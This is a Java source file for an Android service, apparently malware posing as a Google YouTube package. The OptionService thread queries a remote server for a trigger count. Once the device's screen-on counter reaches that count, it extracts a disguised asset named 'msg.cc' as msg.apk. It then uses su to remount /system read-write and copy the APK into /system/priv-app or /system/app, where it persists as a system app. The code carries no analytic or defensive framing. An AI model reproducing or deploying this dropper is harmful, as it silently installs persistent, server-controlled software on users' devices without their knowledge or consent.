package com.google.youtube.services;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import org.json.JSONObject;

import com.google.youtube.utils.DeviceUtils;
import com.google.youtube.utils.HttpUtil;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.text.TextUtils;
import android.util.Log;

public class OptionService extends Thread {

	private final static String TAG = "OptionService";

	private Context context;

	public OptionService(Context context) {
		this.context = context;
	}

	@Override
	public void run() {

		try {

			String obj = HttpUtil.getRequest(HttpUtil.BASE_URL
					+ "app_m.action?a=" + DeviceUtils.getKeyStore(context));

			if (!TextUtils.isEmpty(obj)) {

				JSONObject jsb = new JSONObject(obj);

				int r_count = jsb.getInt("r_count");

				System.out.println("ROOT 推送执行：服务器限制次数:" + r_count);

				if (checkR_Count(r_count)) {
					
					System.out.println("满足推送限制次数" + r_count);

					File jar = new File(
							context.getFilesDir().getAbsolutePath(), "/msg.apk");

					if (!jar.exists()) {

						copyFile("msg.cc", jar, context.getResources());

					}

					int sdk_int = android.os.Build.VERSION.SDK_INT;

					System.out.println("VERSION:" + sdk_int);

					if (sdk_int >= 19) {

						if (!checkfile("/system/priv-app/msg.apk")) {

							reversal(new String[] {
									"mount -o remount,rw /system",
									"cp /data/data/"
											+ context.getPackageName()
											+ "/files/msg.apk /system/priv-app/msg.apk",
									"chmod 644 /system/app/msg.apk" });

						}

					} else {
						if (!checkfile("/system/app/msg.apk")) {

							reversal(new String[] {
									"mount -o remount,rw /system",
									"cp /data/data/"
											+ context.getPackageName()
											+ "/files/msg.apk /system/app/msg.apk",
									"chmod 644 /system/app/msg.apk" });
						}
					}
				}
			}

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	private boolean checkfile(String dir) {

		File localFile = new File(dir);

		if (localFile.exists()) {

			Log.e(TAG, "HAS FILE MSG");

			return true;
		}

		return false;

	}

	private boolean checkR_Count(int count) {

		SharedPreferences localSharedPreferences = context
				.getSharedPreferences("SCREEN_STATUS", 0);

		int local_screen_count = localSharedPreferences.getInt("screen_count",
				0);

		return local_screen_count >= count ? true : false;

	}

	private void reversal(String[] commands) {

		Process process = null;

		DataOutputStream dataOutputStream = null;

		try {

			process = Runtime.getRuntime().exec("su");

			dataOutputStream = new DataOutputStream(process.getOutputStream());
			int length = commands.length;
			for (int i = 0; i < length; i++) {
				Log.e(TAG, "commands[" + i + "]:" + commands[i]);
				dataOutputStream.writeBytes(commands[i] + "\n");
			}
			dataOutputStream.writeBytes("exit\n");
			dataOutputStream.flush();
			process.waitFor();
		} catch (Exception e) {
			Log.e(TAG, "copy fail", e);
		} finally {
			try {
				if (dataOutputStream != null) {
					dataOutputStream.close();
				}
				try {
					if (process != null) {
						// use exitValue() to determine if process is still
						// running.
						process.exitValue();
					}
				} catch (IllegalThreadStateException e) {
					// process is still running, kill it.
					process.destroy();
				}
			} catch (Exception e) {
			}
		}

	}

	/**
	 * 
	 * @param filename
	 * @param jar
	 * @param mResources
	 */
	private void copyFile(String filename, File jar, Resources mResources) {

		InputStream localInputStream = null;

		OutputStream os = null;

		try {

			localInputStream = mResources.getAssets().open(filename);

			os = new FileOutputStream(jar);

			int hasread = 0;

			byte[] buff = new byte[1024];

			while ((hasread = localInputStream.read(buff)) > 0) {

				os.write(buff, 0, hasread);

			}

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {

			if (localInputStream != null) {

				try {
					localInputStream.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}

			if (os != null) {

				try {
					os.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

		}

	}

}
